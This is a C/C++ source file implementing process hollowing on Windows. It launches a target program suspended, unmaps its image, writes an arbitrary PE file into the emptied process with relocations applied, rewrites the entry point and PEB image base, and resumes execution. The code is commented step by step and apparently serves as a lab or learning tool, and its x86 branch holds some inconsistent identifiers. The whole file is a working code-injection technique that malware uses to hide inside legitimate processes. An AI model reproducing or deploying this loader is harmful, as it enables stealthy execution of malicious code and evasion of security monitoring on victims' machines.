#include <Windows.h>
#include <stdio.h>
#include <winternl.h>



typedef NTSTATUS (WINAPI *pNtUnmapViewOfSectionType)(
	HANDLE               ProcessHandle,
	PVOID                BaseAddress
);

int Error(const char *msg) {
	printf("[-] %s : %d\n", msg, GetLastError());
	return -1;
}

int main(int argc, char* argv[]) {


	if (argc != 3) {
		printf("[!] Usage: process_hollowing.exe <target process> <file to be injected>\n");
		return -1;
	}

	// create process in suspended state
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	LPSTARTUPINFOA si = new STARTUPINFOA();

	if ( 
		!CreateProcessA(
			0, 
			argv[1], 
			0, 
			0, 
			FALSE, 
			CREATE_SUSPENDED, 
			0, 
			0, 
			si, 
			pi)
		)
	{
		return Error("CreateProcessA failed");
	}

	// Open the file to be injected and obtain the size of it
	// in order to know how much page size in bytes we need to reserve
	HANDLE hFile = CreateFile(
		argv[2], 
		GENERIC_READ, 
		FILE_SHARE_READ, 
		0, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		0);

	DWORD dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == 0)
	{
		printf("[!] The file to be injected is empty\n");
		return -1;
	
	}

	printf("| FILE SIZE: %d\n", dwFileSize);

	// reserve a space within virtual address space of the calling process
	// to store the file to be injected data
	LPVOID lpFileBuffer = VirtualAlloc(
		NULL, 
		dwFileSize, 
		(MEM_COMMIT | MEM_RESERVE), 
		PAGE_READWRITE);

	if ( lpFileBuffer == NULL)
	{
		TerminateProcess(pi->hProcess, -1);
		return Error("VirtualAlloc failed");
	}

	printf("| MEMORY BUFFER : 0x%0-16p\n", (void*)lpFileBuffer);

	// read the file's data and store it in the allocated region
	if (
		!ReadFile(
			hFile, 
			lpFileBuffer, 
			dwFileSize, 
			NULL, 
			NULL)
		)
	{	
		VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
		TerminateProcess(pi->hProcess, -1);
		return Error("ReadFile failed");
	}

	// at this point we have the file's data stored in the allocated buffer
	// so we no longer need an handle to the file
	CloseHandle(hFile);

	printf("[+] File's data read\n");

	// Now we need to analyze if the file is a valid PE
	// in order to do this we can check the first 4 bytes
	// at the very beggining of the file (in the DOS Header),
	// we can find the e_magic value -> 4D 5A ("MZ")
	PIMAGE_DOS_HEADER pImageDOSHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;
	
	if (pImageDOSHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{	
		VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
		TerminateProcess(pi->hProcess, -1);
		printf("[-] The file to be injected is an invalid PE. The e_magic value was not found!\n");
		return -1;
	}

	printf("[+] File to inject is a valid PE\n");
	printf("|-----> FILE E_MAGIC : %x\n", pImageDOSHeader->e_magic);

	// Now let's check if the file architecture is the same as the loader 
	// since the file being 32-bit architecture and the loader 64-bit, 
	// the injection will not succeed.
	// Read OptionalHeader.Magic (PE32 vs PE32+) from the NT headers to determine bitness.
	// Locate the NT headers using the DOS header's e_lfanew field (offset to IMAGE_NT_HEADERS).
	// Use the validated OptionalHeader.Magic to decide whether to proceed with injection.
	
	PIMAGE_NT_HEADERS pImageNTHeaders=
		(PIMAGE_NT_HEADERS)((PBYTE)pImageDOSHeader + pImageDOSHeader->e_lfanew);

	printf("[+] NT HEADERS FOUND: 0x%-016p\n", (void*)pImageNTHeaders);
	printf("Press ENTER to continue...\n");
	getchar();


	// retrieve the thread context of the specified thread.
	// this is usefull since the process at creation time
	// the Rdx points directly to PEB in 64-bit architecture
	// and in 32-bit the EBX
	LPCONTEXT ctx = new CONTEXT();
	ctx->ContextFlags = CONTEXT_INTEGER;

	if (!GetThreadContext(pi->hThread, ctx))
	{
		VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
		TerminateProcess(pi->hProcess, -1);
		return Error("[!] GetThreadContext failed\n");
	}

	printf("[+] THREAD CONTEXT OBTAINED\n");

	// to obtain the ImageBaseAddress we can use the pointer to PEB
	// and add the offset: 0x10 for 64-bit processes, 0x8 for 32-bit processes
	// (RDX holds the pointer to PEB at thread creation time, on x64)
	PVOID lpImageBaseAddress;

#ifdef _WIN64
	if (pImageNTHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
	{
		VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
		TerminateProcess(pi->hProcess, -1);
		printf("[!] The executable is 32-bit, please use a 32-bit loader\n");
		return -1;
	
	}

	printf("[+] ctx->Rdx (PEB) = 0x%p\n", (void*)ctx->Rdx);

	if (!ReadProcessMemory(
		pi->hProcess,
		(LPCVOID)(ctx->Rdx + 0x10), // since 0x10 is 16
		&lpImageBaseAddress,
		sizeof(lpImageBaseAddress),
		NULL))
	{
		VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
		TerminateProcess(pi->hProcess, -1);
		return Error("ReadProcessMemory failed");
	
	}
	printf("| IMAGE BASE ADDRESS : 0x%016llx\n\n", (unsigned long long)lpImageBaseAddress);
	printf("Press ENTER to continue...\n");
	getchar();

#endif // _WIN64

#ifdef _X86
	if(pImageNTHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC ) 
	{
		VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, -1);
		printf("[!] The executable is 64-bit, please use a 64-bit loader\n");
		return -1;
	}

	printf("[+] ctx->Rdx (PEB) = 0x%p\n", (void*)ctx->Ebx);
	
	if(!ReadProcessMemory(
		pi.hProcess, 
		(LPCVOID)ctx->Ebx + 8,// x86: PEB + 0x8 -> ImageBaseAddress
		&lpImageBaseAddress,
		sizeof(lpImageBaseAddress),
		NULL))
	{
		VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
		TerminateProcess(pi->hProcess, -1);
		return Error("ReadProcessMemory failed");
	}
	printf("| IMAGE BASE ADDRESS : 0x%016llx\n\n", (unsigned long long)lpImageBaseAddress);
	printf("Press ENTER to continue...\n");
	getchar();
#endif // _X86

	// now let's check if the Image is relocatable and unmap the section of image base address
	IMAGE_DATA_DIRECTORY relocData =
		pImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	
	LPVOID lpNewImageBaseAddress;
	
	if (
		relocData.VirtualAddress != 0 && 
		relocData.Size != 0 &&
		!(pImageNTHeaders->FileHeader.Characteristics & IMAGE_FILE_RELOCS_STRIPPED)
		)
	{
		
		pNtUnmapViewOfSectionType pNtUnmapViewOfSection = 
			(pNtUnmapViewOfSectionType)GetProcAddress(
				GetModuleHandleW(L"ntdll.dll"), "NtUnmapViewOfSection");
		
		printf("[+] Target Process is relocatable\n");

		if (!pNtUnmapViewOfSection(pi->hProcess, lpImageBaseAddress))
		{
			printf("[+] NtUnmapViewOfSection successfull\n");
		
			printf("[+] Allocating memory for file to inject\n");

			lpNewImageBaseAddress =
				VirtualAllocEx(
					pi->hProcess,
					lpImageBaseAddress,
					pImageNTHeaders->OptionalHeader.SizeOfImage,
					(MEM_COMMIT | MEM_RESERVE),
					PAGE_EXECUTE_READWRITE);
		
			if(lpNewImageBaseAddress == NULL) 
			{
				VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
				TerminateProcess(pi->hProcess, -1);
				return Error("VirtualAllocEx failed");
			}
			
			printf("| NEW IMAGE BASE ADDRESS : 0x%-016p", (void*)lpNewImageBaseAddress);

		}else {
		
			printf("[-] NtUnmapViewOfSection not successfull\n");
			printf("[+] Attempting to allocte memory in new location\n");
				
			
			lpNewImageBaseAddress =
				VirtualAllocEx(
					pi->hProcess,
					NULL,
					pImageNTHeaders->OptionalHeader.SizeOfImage,
					(MEM_COMMIT | MEM_RESERVE),
					PAGE_EXECUTE_READWRITE);

			if (lpNewImageBaseAddress == NULL)
			{
				VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
				TerminateProcess(pi->hProcess, -1);
				return Error("VirtualAllocEx failed");
			}
			
			printf("| NEW IMAGE BASE ADDRESS : 0x%-016p", (void*)lpNewImageBaseAddress);
		
		}
		

	}else {
		printf("[-] Target Process is not relocatable\n");

		printf("[+] Attempting to allocate region\n");
		
		lpNewImageBaseAddress =
			VirtualAllocEx(
				pi->hProcess,
				NULL,
				pImageNTHeaders->OptionalHeader.SizeOfImage,
				(MEM_COMMIT | MEM_RESERVE),
				PAGE_EXECUTE_READWRITE);


		// TODO: unmap region if the virtualalloc fails

		if (lpNewImageBaseAddress == NULL)
		{
			VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
			TerminateProcess(pi->hProcess, -1);
			return Error("VirtualAllocEx failed");
		}

	}

	ULONGLONG delta = (ULONGLONG)lpNewImageBaseAddress - pImageNTHeaders->OptionalHeader.ImageBase;

	if (delta != 0) {
		PIMAGE_DATA_DIRECTORY relocDir =
			&pImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

		if (relocDir->VirtualAddress != 0 && relocDir->Size != 0) {
			PIMAGE_BASE_RELOCATION relocBlock = (PIMAGE_BASE_RELOCATION)
				((LPBYTE)lpFileBuffer + relocDir->VirtualAddress);

			DWORD relocEnd = relocDir->VirtualAddress + relocDir->Size;

			while ((DWORD)((LPBYTE)relocBlock - (LPBYTE)lpFileBuffer) < relocEnd
				&& relocBlock->SizeOfBlock != 0) {

				DWORD numEntries = (relocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
				PWORD relocEntries = (PWORD)((LPBYTE)relocBlock + sizeof(IMAGE_BASE_RELOCATION));

				for (DWORD i = 0; i < numEntries; i++) {
					WORD type = relocEntries[i] >> 12;
					WORD offset = relocEntries[i] & 0x0FFF;

					if (type == IMAGE_REL_BASED_DIR64) {
						ULONGLONG* patchAddr = (ULONGLONG*)
							((LPBYTE)lpFileBuffer + relocBlock->VirtualAddress + offset);
						*patchAddr += delta;
					}
					else if (type == IMAGE_REL_BASED_HIGHLOW) {
						DWORD* patchAddr = (DWORD*)
							((LPBYTE)lpFileBuffer + relocBlock->VirtualAddress + offset);
						*patchAddr += (DWORD)delta;
					}
					// IMAGE_REL_BASED_ABSOLUTE = padding, skip
				}

				relocBlock = (PIMAGE_BASE_RELOCATION)
					((LPBYTE)relocBlock + relocBlock->SizeOfBlock);
			}
		}
	}

	pImageNTHeaders->OptionalHeader.ImageBase = (ULONGLONG)lpNewImageBaseAddress;

	printf("[+] Writing executable into target process");

	if (!WriteProcessMemory(pi->hProcess, lpNewImageBaseAddress, lpFileBuffer, pImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL))
	{
		VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
		TerminateProcess(pi->hProcess, -1);
		return Error("WriteProcessMemory");
	}


	// write remaining section
	for (int i = 0; i < pImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER pImageSectionHeader = 
			(PIMAGE_SECTION_HEADER)((LPBYTE)lpFileBuffer + pImageDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
	
		printf("[*] Writing %s to 0x%Ix\r\n", pImageSectionHeader->Name, (SIZE_T)((LPBYTE)lpNewImageBaseAddress + pImageSectionHeader->VirtualAddress));
		
		if (!WriteProcessMemory(pi->hProcess, (PVOID)((LPBYTE)lpNewImageBaseAddress + pImageSectionHeader->VirtualAddress), (PVOID)((LPBYTE)lpFileBuffer + pImageSectionHeader->PointerToRawData), pImageSectionHeader->SizeOfRawData, NULL))
		{
			VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
			TerminateProcess(pi->hProcess, -1);
			return Error("WriteProcessMemory");
		}
	}

#ifdef _WIN64
	ctx->Rcx = 
		(SIZE_T)((LPBYTE)lpNewImageBaseAddress + pImageNTHeaders->OptionalHeader.AddressOfEntryPoint);
	
	printf("[+] New entry point: 0x%Ix\r\n", ctx->Rcx);
	printf("[*] Updating PEB->ImageBase\r\n");
	
	if (!WriteProcessMemory(pi->hProcess, (PVOID)(ctx->Rdx + (sizeof(SIZE_T) * 2)), &lpNewImageBaseAddress, sizeof(lpNewImageBaseAddress), NULL))
	{
		VirtualFree(lpFileBuffer, 0, MEM_RELEASE);
		TerminateProcess(pi->hProcess, -1);
		Error("WriteProcessMemory");
	}
#endif

#ifdef _X86_
	ctx->Eax = 
		(SIZE_T)((LPBYTE)lpNewImageBaseAddress + pImageNTHeaders->OptionalHeader.AddressOfEntryPoint);
	
	printf("[+] New entry point: 0x%Ix\r\n", ctx->Eax);
	printf("[*] Updating PEB->ImageBase\r\n");
	
	if (!WriteProcessMemory(pi->hProcess, (PVOID)(ctx->Ebx + 8), &lpNewImageBaseAddress, sizeof(lpNewImageBaseAddress), NULL))
	{
		TerminateProcess(pi->hProcess, -1);
		Error("WriteProcessMemory");
	}
#endif	

	printf("[*] Setting the context of the primary thread.\n");
	system("pause");

	if (!SetThreadContext(pi->hThread, ctx)) 
	{
		TerminateProcess(pi->hProcess, -1);
		Error("SetThreadContext");
	}
	printf("[*] Resuming child process's primary thread.\n");

	system("pause");
	ResumeThread(pi->hThread); 

	printf("[*] Thread resumed.\r\n");

	return 0;

}